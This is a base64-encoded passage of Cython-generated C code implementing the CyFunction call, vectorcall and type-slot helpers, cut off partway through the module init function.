OwogICAgcmVwciA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCI8Y3lmdW5jdGlvbiAlVSBhdCAlcD4iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wLT5mdW5jX3F1YWxuYW1lLCAodm9pZCAqKW9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVwcjsKfQpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnLCBQeU9iamVjdCAqa3cpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5T2JqZWN0ICpmID0gKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jKS0+ZnVuYzsKICAgIFB5Q0Z1bmN0aW9uIG1ldGg7CiAgICBpbnQgZmxhZ3M7CiAgICBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oZik7CiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDsKICAgIGZsYWdzID0gUHlDRnVuY3Rpb25fR2V0RmxhZ3MoZik7CiAgICBpZiAodW5saWtlbHkoZmxhZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBQeUNGdW5jdGlvbk9iamVjdCogZiA9IChQeUNGdW5jdGlvbk9iamVjdCopZnVuYzsKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBmLT5tX21sLT5tbF9tZXRoOwogICAgaW50IGZsYWdzID0gZi0+bV9tbC0+bWxfZmxhZ3M7CiNlbmRpZgogICAgUHlfc3NpemVfdCBzaXplOwogICAgc3dpdGNoIChmbGFncyAmIChNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTIHwgTUVUSF9OT0FSR1MgfCBNRVRIX08pKSB7CiAgICBjYXNlIE1FVEhfVkFSQVJHUzoKICAgICAgICBpZiAobGlrZWx5KGt3ID09IE5VTEwgfHwgUHlEaWN0X1NpemUoa3cpID09IDApKQogICAgICAgICAgICByZXR1cm4gKCptZXRoKShzZWxmLCBhcmcpOwogICAgICAgIGJyZWFrOwogICAgY2FzZSBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTOgogICAgICAgIHJldHVybiAoKihQeUNGdW5jdGlvbldpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSltZXRoKShzZWxmLCBhcmcsIGt3KTsKICAgIGNhc2UgTUVUSF9OT0FSR1M6CiAgICAgICAgaWYgKGxpa2VseShrdyA9PSBOVUxMIHx8IFB5RGljdF9TaXplKGt3KSA9PSAwKSkgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfR0VUX1NJWkUoYXJnKTsKI2Vsc2UKICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfU2l6ZShhcmcpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoc2l6ZSA8IDApKSByZXR1cm4gTlVMTDsKI2VuZGlmCiAgICAgICAgICAgIGlmIChsaWtlbHkoc2l6ZSA9PSAwKSkKICAgICAgICAgICAgICAgIHJldHVybiAoKm1ldGgpKHNlbGYsIE5VTEwpOwogICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKAogICAgICAgICAgICAgICAgKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMsCiAgICAgICAgICAgICAgICAidGFrZXMgbm8gYXJndW1lbnRzIiwgc2l6ZSk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICBicmVhazsKICAgIGNhc2UgTUVUSF9POgogICAgICAgIGlmIChsaWtlbHkoa3cgPT0gTlVMTCB8fCBQeURpY3RfU2l6ZShrdykgPT0gMCkpIHsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX0dFVF9TSVpFKGFyZyk7CiNlbHNlCiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX1NpemUoYXJnKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNpemUgPCAwKSkgcmV0dXJuIE5VTEw7CiNlbmRpZgogICAgICAgICAgICBpZiAobGlrZWx5KHNpemUgPT0gMSkpIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpyZXN1bHQsICphcmcwOwogICAgICAgICAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgICAgICBhcmcwID0gUHlUdXBsZV9HRVRfSVRFTShhcmcsIDApOwogICAgICAgICAgICAgICAgI2Vsc2UKICAgICAgICAgICAgICAgIGFyZzAgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oYXJnLCAwKTsgaWYgKHVubGlrZWx5KCFhcmcwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIHJlc3VsdCA9ICgqbWV0aCkoc2VsZiwgYXJnMCk7CiAgICAgICAgICAgICAgICAjaWYgIShDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUykKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihhcmcwKTsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgICAgICAgICAgfQogICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKAogICAgICAgICAgICAgICAgKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMsCiAgICAgICAgICAgICAgICAidGFrZXMgZXhhY3RseSBvbmUgYXJndW1lbnQiLCBzaXplKTsKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgZGVmYXVsdDoKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfU3lzdGVtRXJyb3IsICJCYWQgY2FsbCBmbGFncyBmb3IgQ3lGdW5jdGlvbiIpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV90eXBlX2Vycm9yKAogICAgICAgIChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jLCAidGFrZXMgbm8ga2V5d29yZCBhcmd1bWVudHMiKTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0NhbGwoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcsIFB5T2JqZWN0ICprdykgewogICAgUHlPYmplY3QgKnNlbGYsICpyZXN1bHQ7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5mdW5jKTsKICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fc2VsZjsKI2VuZGlmCiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoZnVuYywgc2VsZiwgYXJnLCBrdyk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9DYWxsQXNNZXRob2QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmdzLCBQeU9iamVjdCAqa3cpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jOwojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKQogICAgIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZjID0gX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoY3lmdW5jKTsKICAgIGlmICh2YykgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgIHJldHVybiBfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0KGZ1bmMsIHZjLCAmUHlUdXBsZV9HRVRfSVRFTShhcmdzLCAwKSwgKHNpemVfdClQeVR1cGxlX0dFVF9TSVpFKGFyZ3MpLCBrdyk7CiNlbHNlCiAgICAgICAgKHZvaWQpICZfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0OwogICAgICAgIHJldHVybiBQeVZlY3RvcmNhbGxfQ2FsbChmdW5jLCBhcmdzLCBrdyk7CiNlbmRpZgogICAgfQojZW5kaWYKICAgIGlmICgoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ0NMQVNTKSAmJiAhKGN5ZnVuYy0+ZmxhZ3MgJiBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCkpIHsKICAgICAgICBQeV9zc2l6ZV90IGFyZ2M7CiAgICAgICAgUHlPYmplY3QgKm5ld19hcmdzOwogICAgICAgIFB5T2JqZWN0ICpzZWxmOwojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBhcmdjID0gUHlUdXBsZV9HRVRfU0laRShhcmdzKTsKI2Vsc2UKICAgICAgICBhcmdjID0gUHlUdXBsZV9TaXplKGFyZ3MpOwogICAgICAgIGlmICh1bmxpa2VseShhcmdjIDwgMCkpIHJldHVybiBOVUxMOwojZW5kaWYKICAgICAgICBuZXdfYXJncyA9IFB5VHVwbGVfR2V0U2xpY2UoYXJncywgMSwgYXJnYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFuZXdfYXJncykpCiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIHNlbGYgPSBQeVR1cGxlX0dldEl0ZW0oYXJncywgMCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSkgewogICAgICAgICAgICBQeV9ERUNSRUYobmV3X2FyZ3MpOwogICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAgInVuYm91bmQgbWV0aG9kICUuMjAwUygpIG5lZWRzIGFuIGFyZ3VtZW50IiwKICAgICAgICAgICAgICAgICAgICAgICAgIGN5ZnVuYy0+ZnVuY19xdWFsbmFtZSk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoZnVuYywgc2VsZiwgbmV3X2FyZ3MsIGt3KTsKICAgICAgICBQeV9ERUNSRUYobmV3X2FyZ3MpOwogICAgfSBlbHNlIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGwoZnVuYywgYXJncywga3cpOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd25hbWVzKQp7CiAgICBpbnQgcmV0ID0gMDsKICAgIGlmICgoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ0NMQVNTKSAmJiAhKGN5ZnVuYy0+ZmxhZ3MgJiBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCkpIHsKICAgICAgICBpZiAodW5saWtlbHkobmFyZ3MgPCAxKSkgewogICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX3R5cGVfZXJyb3IoCiAgICAgICAgICAgICAgICBjeWZ1bmMsICJuZWVkcyBhbiBhcmd1bWVudCIpOwogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgICAgIHJldCA9IDE7CiAgICB9CiAgICBpZiAodW5saWtlbHkoa3duYW1lcykgJiYgdW5saWtlbHkoX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd25hbWVzKSkpIHsKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX3R5cGVfZXJyb3IoCiAgICAgICAgICAgIGN5ZnVuYywgInRha2VzIG5vIGtleXdvcmQgYXJndW1lbnRzIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIHJldDsKfQpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTk9BUkdTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKQp7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7CiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTAogICAgUHlfc3NpemVfdCBuYXJncyA9IChQeV9zc2l6ZV90KW5hcmdzZjsKI2Vsc2UKICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBQeVZlY3RvcmNhbGxfTkFSR1MobmFyZ3NmKTsKI2VuZGlmCiAgICBQeU9iamVjdCAqc2VsZjsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihjeWZ1bmMtPmZ1bmMpOwogICAgaWYgKHVubGlrZWx5KCFtZXRoKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBQeUNGdW5jdGlvbiBtZXRoID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9tbC0+bWxfbWV0aDsKI2VuZGlmCiAgICBzd2l0Y2ggKF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9DaGVja0FyZ3MoY3lmdW5jLCBuYXJncywga3duYW1lcykpIHsKICAgIGNhc2UgMToKICAgICAgICBzZWxmID0gYXJnc1swXTsKICAgICAgICBhcmdzICs9IDE7CiAgICAgICAgbmFyZ3MgLT0gMTsKICAgICAgICBicmVhazsKICAgIGNhc2UgMDoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPmZ1bmMpOwogICAgICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICAgICAgc2VsZiA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fc2VsZjsKI2VuZGlmCiAgICAgICAgYnJlYWs7CiAgICBkZWZhdWx0OgogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgaWYgKHVubGlrZWx5KG5hcmdzICE9IDApKSB7CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV9hcmd1bWVudF9jb3VudF9lcnJvcigKICAgICAgICAgICAgY3lmdW5jLCAidGFrZXMgbm8gYXJndW1lbnRzIiwgbmFyZ3MpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgcmV0dXJuIG1ldGgoc2VsZiwgTlVMTCk7Cn0Kc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX08oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpCnsKICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYyA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopZnVuYzsKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMCiAgICBQeV9zc2l6ZV90IG5hcmdzID0gKFB5X3NzaXplX3QpbmFyZ3NmOwojZWxzZQogICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpOwojZW5kaWYKICAgIFB5T2JqZWN0ICpzZWxmOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlDRnVuY3Rpb24gbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGN5ZnVuYy0+ZnVuYyk7CiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX21sLT5tbF9tZXRoOwojZW5kaWYKICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBrd25hbWVzKSkgewogICAgY2FzZSAxOgogICAgICAgIHNlbGYgPSBhcmdzWzBdOwogICAgICAgIGFyZ3MgKz0gMTsKICAgICAgICBuYXJncyAtPSAxOwogICAgICAgIGJyZWFrOwogICAgY2FzZSAwOgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmOwojZW5kaWYKICAgICAgICBicmVhazsKICAgIGRlZmF1bHQ6CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICBpZiAodW5saWtlbHkobmFyZ3MgIT0gMSkpIHsKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKAogICAgICAgICAgICBjeWZ1bmMsICJ0YWtlcyBleGFjdGx5IG9uZSBhcmd1bWVudCIsIG5hcmdzKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIHJldHVybiBtZXRoKHNlbGYsIGFyZ3NbMF0pOwp9CnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9GQVNUQ0FMTF9LRVlXT1JEUyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcykKewogICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKilmdW5jOwojaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwKICAgIFB5X3NzaXplX3QgbmFyZ3MgPSAoUHlfc3NpemVfdCluYXJnc2Y7CiNlbHNlCiAgICBQeV9zc2l6ZV90IG5hcmdzID0gUHlWZWN0b3JjYWxsX05BUkdTKG5hcmdzZik7CiNlbmRpZgogICAgUHlPYmplY3QgKnNlbGY7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeUNGdW5jdGlvbiBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oY3lmdW5jLT5mdW5jKTsKICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgUHlDRnVuY3Rpb24gbWV0aCA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fbWwtPm1sX21ldGg7CiNlbmRpZgogICAgc3dpdGNoIChfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKGN5ZnVuYywgbmFyZ3MsIE5VTEwpKSB7CiAgICBjYXNlIDE6CiAgICAgICAgc2VsZiA9IGFyZ3NbMF07CiAgICAgICAgYXJncyArPSAxOwogICAgICAgIG5hcmdzIC09IDE7CiAgICAgICAgYnJlYWs7CiAgICBjYXNlIDA6CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5mdW5jKTsKICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpICYmIFB5RXJyX09jY3VycmVkKCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX3NlbGY7CiNlbmRpZgogICAgICAgIGJyZWFrOwogICAgZGVmYXVsdDoKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIHJldHVybiAoKF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSltZXRoKShzZWxmLCBhcmdzLCBuYXJncywga3duYW1lcyk7Cn0Kc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcykKewogICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKilmdW5jOwogICAgUHlUeXBlT2JqZWN0ICpjbHMgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooY3lmdW5jKTsKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMCiAgICBQeV9zc2l6ZV90IG5hcmdzID0gKFB5X3NzaXplX3QpbmFyZ3NmOwojZWxzZQogICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpOwojZW5kaWYKICAgIFB5T2JqZWN0ICpzZWxmOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlDRnVuY3Rpb24gbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGN5ZnVuYy0+ZnVuYyk7CiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX21sLT5tbF9tZXRoOwojZW5kaWYKICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBOVUxMKSkgewogICAgY2FzZSAxOgogICAgICAgIHNlbGYgPSBhcmdzWzBdOwogICAgICAgIGFyZ3MgKz0gMTsKICAgICAgICBuYXJncyAtPSAxOwogICAgICAgIGJyZWFrOwogICAgY2FzZSAwOgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmOwojZW5kaWYKICAgICAgICBicmVhazsKICAgIGRlZmF1bHQ6CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICByZXR1cm4gKChfX1B5eF9QeUNNZXRob2QpKHZvaWQoKikodm9pZCkpbWV0aCkoc2VsZiwgY2xzLCBhcmdzLCAoc2l6ZV90KW5hcmdzLCBrd25hbWVzKTsKfQojZW5kaWYKc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X0N5RnVuY3Rpb25UeXBlX3Nsb3RzW10gPSB7CiAgICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX2RlYWxsb2N9LAogICAge1B5X3RwX3JlcHIsICh2b2lkICopX19QeXhfQ3lGdW5jdGlvbl9yZXByfSwKICAgIHtQeV90cF9jYWxsLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fQ2FsbEFzTWV0aG9kfSwKICAgIHtQeV90cF90cmF2ZXJzZSwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX3RyYXZlcnNlfSwKICAgIHtQeV90cF9jbGVhciwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX2NsZWFyfSwKICAgIHtQeV90cF9tZXRob2RzLCAodm9pZCAqKV9fcHl4X0N5RnVuY3Rpb25fbWV0aG9kc30sCiAgICB7UHlfdHBfbWVtYmVycywgKHZvaWQgKilfX3B5eF9DeUZ1bmN0aW9uX21lbWJlcnN9LAogICAge1B5X3RwX2dldHNldCwgKHZvaWQgKilfX3B5eF9DeUZ1bmN0aW9uX2dldHNldHN9LAogICAge1B5X3RwX2Rlc2NyX2dldCwgKHZvaWQgKilfX1B5eF9QeU1ldGhvZF9OZXd9LAogICAgezAsIDB9LAp9OwpzdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfQ3lGdW5jdGlvblR5cGVfc3BlYyA9IHsKICAgIF9fUFlYX1RZUEVfTU9EVUxFX1BSRUZJWCAiY3l0aG9uX2Z1bmN0aW9uX29yX21ldGhvZCIsCiAgICBzaXplb2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCksCiAgICAwLAojaWZkZWYgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUgogICAgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUiB8CiNlbmRpZgojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKI2lmIGRlZmluZWQoUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwpCiAgICBQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTCB8CiNlbGlmIGRlZmluZWQoX1B5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMKQogICAgX1B5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMIHwKI2VuZGlmCiNlbmRpZiAvLyBDWVRIT05fTUVUSF9GQVNUQ0FMTAojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMAogICAgUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFIHwKI2VuZGlmCiAgICBQeV9UUEZMQUdTX0RFRkFVTFQgfCBQeV9UUEZMQUdTX0hBVkVfR0MgfCBQeV9UUEZMQUdTX0JBU0VUWVBFLAogICAgX19weXhfQ3lGdW5jdGlvblR5cGVfc2xvdHMKfTsKc3RhdGljIGludCBfX3B5eF9DeUZ1bmN0aW9uX2luaXQoUHlPYmplY3QgKm1vZHVsZSkgewogICAgX19weXhfbXN0YXRldHlwZSAqbXN0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobW9kdWxlKTsKICAgIG1zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUgPSBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYygKICAgICAgICBtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSwgbW9kdWxlLCAmX19weXhfQ3lGdW5jdGlvblR5cGVfc3BlYywgTlVMTCk7CiAgICBpZiAodW5saWtlbHkobXN0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSA9PSBOVUxMKSkgewogI